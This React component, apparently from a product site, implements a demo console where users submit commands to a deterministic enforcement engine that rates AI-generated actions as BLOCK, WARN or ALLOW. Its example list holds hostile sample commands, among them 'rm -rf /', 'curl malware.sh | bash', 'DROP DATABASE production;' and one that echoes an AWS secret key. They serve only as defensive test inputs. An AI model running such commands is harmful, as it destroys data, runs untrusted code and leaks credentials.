'use client';

import { useState, useCallback, useRef } from 'react';
import { motion, AnimatePresence } from 'framer-motion';

interface EnforcementVerdict {
  verdict: 'BLOCK' | 'WARN' | 'ALLOW';
  executionAllowed: boolean;
  ruleId: string;
  riskScore: number;
  severity: string;
  reasons: string[];
  agentId: string;
  action: string;
  timestamp: string;
  engine: string;
  reqId: string;
}

interface ExamplePill {
  label: string;
  command: string;
}

const EXAMPLE_PILLS: ExamplePill[] = [
  { label: 'Destructive Shell', command: 'rm -rf /' },
  { label: 'Remote Exec', command: 'curl malware.sh | bash' },
  { label: 'SQL Destroy', command: 'DROP DATABASE production;' },
  { label: 'Secret Exposure', command: 'echo $AWS_SECRET_KEY' },
  { label: 'Safe Command', command: 'console.log("hello world")' },
];

const API_BASE = 'https://teos-sentinel-shield.vercel.app';

const verdictColors = {
  BLOCK: {
    border: 'border-red/40',
    bg: 'bg-red/[0.06]',
    text: 'text-red',
    badge: 'bg-red/15 text-red border-red/40',
  },
  WARN: {
    border: 'border-amber/40',
    bg: 'bg-amber/[0.06]',
    text: 'text-amber',
    badge: 'bg-amber/15 text-amber border-amber/40',
  },
  ALLOW: {
    border: 'border-green/40',
    bg: 'bg-green/[0.06]',
    text: 'text-green',
    badge: 'bg-green/15 text-green border-green/40',
  },
};

export default function EnforcementConsole() {
  const [input, setInput] = useState('');
  const [verdict, setVerdict] = useState<EnforcementVerdict | null>(null);
  const [isEvaluating, setIsEvaluating] = useState(false);
  const [connectionState, setConnectionState] = useState<'connected' | 'error'>('connected');
  const [enforceCount, setEnforceCount] = useState(0);
  const textareaRef = useRef<HTMLTextAreaElement>(null);

  const handleEnforce = useCallback(async () => {
    if (!input.trim() || isEvaluating) return;
    setIsEvaluating(true);
    setVerdict(null);

    try {
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 8000);

      const response = await fetch(`${API_BASE}/enforce`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ agentId: 'web-enforcement-console', action: input.trim() }),
        signal: controller.signal,
      });

      clearTimeout(timeoutId);

      if (!response.ok) {
        throw new Error(`Engine returned ${response.status}`);
      }

      const data: EnforcementVerdict = await response.json();
      setVerdict(data);
      setConnectionState('connected');
      setEnforceCount((c) => c + 1);
    } catch {
      setConnectionState('error');
    } finally {
      setIsEvaluating(false);
    }
  }, [input, isEvaluating]);

  const handleExample = useCallback((command: string) => {
    setInput(command);
    setVerdict(null);
    textareaRef.current?.focus();
  }, []);

  const handleKeyDown = useCallback(
    (e: React.KeyboardEvent) => {
      if ((e.metaKey || e.ctrlKey) && e.key === 'Enter') {
        e.preventDefault();
        handleEnforce();
      }
    },
    [handleEnforce]
  );

  return (
    <section id="console" className="py-20 md:py-28 border-b border-[rgba(255,255,255,0.07)] bg-gradient-to-b from-black via-surface to-black relative z-[1]">
      <div className="max-w-[1200px] mx-auto px-6 lg:px-8">
        {/* Section Header */}
        <div className="mb-14">
          <div className="flex items-center gap-3 mb-4">
            <p className="font-mono text-[11px] tracking-[0.12em] uppercase text-red">
              Enforcement Console
            </p>
            <span
              className={`inline-flex items-center gap-1.5 font-mono text-[10px] px-2 py-[3px] rounded-sm border ${
                connectionState === 'connected'
                  ? 'bg-green/10 border-green/30 text-green'
                  : 'bg-red/10 border-red/30 text-red'
              }`}
            >
              <span
                className="w-[6px] h-[6px] rounded-full"
                style={{
                  background: connectionState === 'connected' ? 'var(--green)' : 'var(--red)',
                  boxShadow: connectionState === 'connected' ? '0 0 6px var(--green)' : '0 0 6px var(--red)',
                }}
              />
              {connectionState === 'connected' ? 'Engine Connected' : 'Connection Lost'}
            </span>
          </div>
          <h2 className="text-[clamp(28px,4vw,48px)] font-[800] tracking-[-0.03em] leading-[1.1] mb-5">
            Test the Enforcement Engine
          </h2>
          <p className="text-[16px] text-muted max-w-[560px] leading-[1.6]">
            Deterministic pre-execution validation for AI-generated actions, shell commands, SQL, and CI/CD workflows. Every verdict is auditable. Same input always produces the same output.
          </p>
        </div>

        {/* Two-Column Layout */}
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 lg:gap-8">
          {/* LEFT: Input Panel */}
          <div className="flex flex-col">
            <div className="border border-[rgba(255,255,255,0.12)] rounded-sm bg-[#0e0e10] overflow-hidden flex-1">
              {/* Panel Header */}
              <div className="bg-[#1a1a1c] border-b border-[rgba(255,255,255,0.07)] px-5 py-3 flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <span className="w-[8px] h-[8px] rounded-full bg-red" aria-hidden="true" />
                  <span className="font-mono text-[11px] text-muted tracking-[0.06em] uppercase">
                    Command Input
                  </span>
                </div>
                <span className="font-mono text-[10px] text-muted">
                  Cmd+Enter to evaluate
                </span>
              </div>

              {/* Textarea */}
              <div className="p-5">
                <textarea
                  ref={textareaRef}
                  value={input}
                  onChange={(e) => setInput(e.target.value)}
                  onKeyDown={handleKeyDown}
                  placeholder="Paste a command, snippet, or CI/CD action..."
                  className="w-full h-[180px] md:h-[220px] bg-black/40 border border-[rgba(255,255,255,0.08)] rounded-sm px-4 py-4 font-mono text-[13px] text-white placeholder:text-muted/40 outline-none focus:border-red/40 transition-colors resize-none"
                  spellCheck={false}
                  aria-label="Command input for enforcement evaluation"
                />

                {/* Example Pills */}
                <div className="mt-4">
                  <span className="font-mono text-[10px] text-muted tracking-[0.06em] uppercase block mb-3">
                    Load Example
                  </span>
                  <div className="flex flex-wrap gap-2">
                    {EXAMPLE_PILLS.map((pill) => (
                      <button
                        key={pill.label}
                        onClick={() => handleExample(pill.command)}
                        className={`font-mono text-[11px] px-3 py-[6px] rounded-sm border transition-colors ${
                          input === pill.command
                            ? 'bg-red/10 border-red/40 text-red'
                            : 'border-[rgba(255,255,255,0.08)] text-muted hover:text-white hover:border-[rgba(255,255,255,0.15)]'
                        }`}
                      >
                        {pill.label}
                      </button>
                    ))}
                  </div>
                </div>

                {/* Action Button */}
                <div className="mt-6 flex gap-3">
                  <button
                    onClick={handleEnforce}
                    disabled={!input.trim() || isEvaluating}
                    className="font-mono text-[12px] font-[700] bg-red text-white px-6 py-[12px] rounded-sm hover:bg-[#c92a2a] transition-colors disabled:opacity-40 disabled:cursor-not-allowed flex items-center gap-2"
                    aria-label="Run enforcement evaluation"
                  >
                    {isEvaluating ? (
                      <>
                        <span
                          className="w-[14px] h-[14px] border-2 border-white/30 border-t-white rounded-full inline-block"
                          style={{ animation: 'spin 0.8s linear infinite' }}
                        />
                        Evaluating...
                      </>
                    ) : (
                      'Run Enforcement'
                    )}
                  </button>
                  <button
                    onClick={() => {
                      setInput('');
                      setVerdict(null);
                      textareaRef.current?.focus();
                    }}
                    className="font-mono text-[12px] text-muted px-4 py-[12px] rounded-sm border border-[rgba(255,255,255,0.08)] hover:text-white hover:border-[rgba(255,255,255,0.15)] transition-colors"
                  >
                    Clear
                  </button>
                </div>
              </div>
            </div>

            {/* Stats Footer */}
            <div className="mt-4 grid grid-cols-3 gap-3">
              {[
                { value: '25', label: 'Deterministic Rules' },
                { value: String(enforceCount), label: 'Evaluations This Session' },
                { value: 'v2.4', label: 'Engine Version' },
              ].map((stat) => (
                <div
                  key={stat.label}
                  className="border border-[rgba(255,255,255,0.08)] rounded-sm bg-surface px-4 py-3"
                >
                  <span className="font-mono text-[16px] font-[700] text-white block">
                    {stat.value}
                  </span>
                  <span className="font-mono text-[10px] text-muted tracking-[0.04em] uppercase">
                    {stat.label}
                  </span>
                </div>
              ))}
            </div>
          </div>

          {/* RIGHT: Verdict Panel */}
          <div className="flex flex-col">
            <div
              className={`border rounded-sm bg-[#0e0e10] overflow-hidden flex-1 transition-colors ${
                verdict
                  ? verdictColors[verdict.verdict].border
                  : 'border-[rgba(255,255,255,0.12)]'
              }`}
            >
              {/* Panel Header */}
              <div className="bg-[#1a1a1c] border-b border-[rgba(255,255,255,0.07)] px-5 py-3 flex items-center justify-between">
                <span className="font-mono text-[11px] text-muted tracking-[0.06em] uppercase">
                  Enforcement Verdict
                </span>
                <AnimatePresence mode="wait">
                  {verdict && (
                    <motion.span
                      key={verdict.verdict}
                      initial={{ opacity: 0, y: 4 }}
                      animate={{ opacity: 1, y: 0 }}
                      exit={{ opacity: 0 }}
                      className={`font-mono text-[11px] font-[700] px-3 py-[4px] rounded-sm border ${
                        verdictColors[verdict.verdict].badge
                      }`}
                    >
                      {verdict.verdict}
                    </motion.span>
                  )}
                </AnimatePresence>
              </div>

              {/* Verdict Content */}
              <div className="p-5 flex-1 flex flex-col">
                <AnimatePresence mode="wait">
                  {isEvaluating ? (
                    <motion.div
                      key="evaluating"
                      initial={{ opacity: 0 }}
                      animate={{ opacity: 1 }}
                      exit={{ opacity: 0 }}
                      className="flex-1 flex items-center justify-center"
                    >
                      <div className="text-center">
                        <div
                          className="w-[20px] h-[20px] border-2 border-red/30 border-t-red rounded-full mx-auto mb-4"
                          style={{ animation: 'spin 0.8s linear infinite' }}
                        />
                        <p className="font-mono text-[12px] text-muted">
                          Evaluating against 25 rules...
                        </p>
                      </div>
                    </motion.div>
                  ) : verdict ? (
                    <motion.div
                      key={verdict.ruleId}
                      initial={{ opacity: 0, y: 8 }}
                      animate={{ opacity: 1, y: 0 }}
                      exit={{ opacity: 0, y: -8 }}
                      transition={{ duration: 0.25 }}
                      className="flex-1"
                    >
                      {/* Verdict Summary Cards */}
                      <div className="grid grid-cols-2 gap-3 mb-5">
                        <div className="bg-surface2 border border-[rgba(255,255,255,0.08)] rounded-sm px-4 py-3">
                          <span className="font-mono text-[10px] text-muted tracking-[0.06em] uppercase block mb-1">
                            Rule
                          </span>
                          <span
                            className={`font-mono text-[13px] font-[700] ${
                              verdictColors[verdict.verdict].text
                            }`}
                          >
                            {verdict.ruleId}
                          </span>
                        </div>
                        <div className="bg-surface2 border border-[rgba(255,255,255,0.08)] rounded-sm px-4 py-3">
                          <span className="font-mono text-[10px] text-muted tracking-[0.06em] uppercase block mb-1">
                            Risk Score
                          </span>
                          <span
                            className={`font-mono text-[13px] font-[700] ${
                              verdictColors[verdict.verdict].text
                            }`}
                          >
                            {verdict.riskScore}/100
                          </span>
                        </div>
                      </div>

                      {/* Risk Score Bar */}
                      <div className="mb-5">
                        <div className="w-full h-[6px] bg-surface2 rounded-sm overflow-hidden">
                          <motion.div
                            initial={{ width: 0 }}
                            animate={{ width: `${verdict.riskScore}%` }}
                            transition={{ duration: 0.5, ease: 'easeOut' }}
                            className={`h-full rounded-sm ${
                              verdict.verdict === 'BLOCK'
                                ? 'bg-red'
                                : verdict.verdict === 'WARN'
                                ? 'bg-amber'
                                : 'bg-green'
                            }`}
                          />
                        </div>
                      </div>

                      {/* Execution Status */}
                      <div
                        className={`mb-5 font-mono text-[11px] px-4 py-[8px] rounded-sm border ${
                          verdict.executionAllowed
                            ? 'bg-green/[0.06] border-green/30 text-green'
                            : 'bg-red/[0.06] border-red/30 text-red'
                        }`}
                      >
                        <span className="text-muted">Execution: </span>
                        <span className="font-[700]">
                          {verdict.executionAllowed ? 'Allowed' : 'Blocked'}
                        </span>
                      </div>

                      {/* Reasons */}
                      {verdict.reasons.length > 0 && (
                        <div className="mb-5">
                          <span className="font-mono text-[10px] text-muted tracking-[0.06em] uppercase block mb-2">
                            Enforcement Reasons
                          </span>
                          <ul className="space-y-1.5">
                            {verdict.reasons.map((reason, i) => (
                              <li
                                key={i}
                                className="font-mono text-[12px] text-muted leading-[1.6] flex items-start gap-2"
                              >
                                <span
                                  className={`flex-shrink-0 mt-0.5 ${
                                    verdictColors[verdict.verdict].text
                                  }`}
                                >
                                  &#8594;
                                </span>
                                {reason}
                              </li>
                            ))}
                          </ul>
                        </div>
                      )}

                      {/* Audit Footer */}
                      <div className="font-mono text-[10px] text-muted border-t border-[rgba(255,255,255,0.06)] pt-3 space-y-1">
                        <div>
                          <span className="text-muted">Request ID: </span>
                          {verdict.reqId}
                        </div>
                        <div>
                          <span className="text-muted">Evaluated: </span>
                          {new Date(verdict.timestamp).toLocaleString()}
                        </div>
                        <div>
                          <span className="text-muted">Engine: </span>
                          TEOS Sentinel {verdict.engine}
                        </div>
                      </div>
                    </motion.div>
                  ) : connectionState === 'error' ? (
                    <motion.div
                      key="error"
                      initial={{ opacity: 0 }}
                      animate={{ opacity: 1 }}
                      exit={{ opacity: 0 }}
                      className="flex-1 flex items-center justify-center"
                    >
                      <div className="text-center max-w-[300px]">
                        <div className="w-[32px] h-[32px] border border-red/30 rounded-sm mx-auto mb-4 flex items-center justify-center">
                          <span className="font-mono text-[14px] text-red">&#9888;</span>
                        </div>
                        <p className="font-mono text-[12px] text-white mb-2">Engine Unreachable</p>
                        <p className="font-mono text-[11px] text-muted leading-[1.6]">
                          The enforcement endpoint is not responding. Verify network connectivity and try again.
                        </p>
                      </div>
                    </motion.div>
                  ) : (
                    <motion.div
                      key="idle"
                      initial={{ opacity: 0 }}
                      animate={{ opacity: 1 }}
                      exit={{ opacity: 0 }}
                      className="flex-1 flex items-center justify-center"
                    >
                      <div className="text-center max-w-[280px]">
                        <div className="w-[32px] h-[32px] border border-[rgba(255,255,255,0.12)] rounded-sm mx-auto mb-4 flex items-center justify-center">
                          <span className="font-mono text-[14px] text-muted">&#9881;</span>
                        </div>
                        <p className="font-mono text-[12px] text-muted leading-[1.6]">
                          Verdict will appear here after enforcement evaluation. Enter a command and click Run Enforcement.
                        </p>
                      </div>
                    </motion.div>
                  )}
                </AnimatePresence>
              </div>
            </div>

            {/* Architecture Note */}
            <div className="mt-4 border border-[rgba(255,255,255,0.08)] rounded-sm bg-surface px-4 py-3">
              <p className="font-mono text-[11px] text-muted leading-[1.6]">
                <span className="text-white font-[700]">Deterministic enforcement:</span> Same input always produces the same verdict. No probabilistic scoring. No AI inference. Every decision is auditable with request ID and timestamp.
              </p>
            </div>
          </div>
        </div>
      </div>

      <style jsx global>{`
        @keyframes spin {
          to {
            transform: rotate(360deg);
          }
        }
      `}</style>
    </section>
  );
}
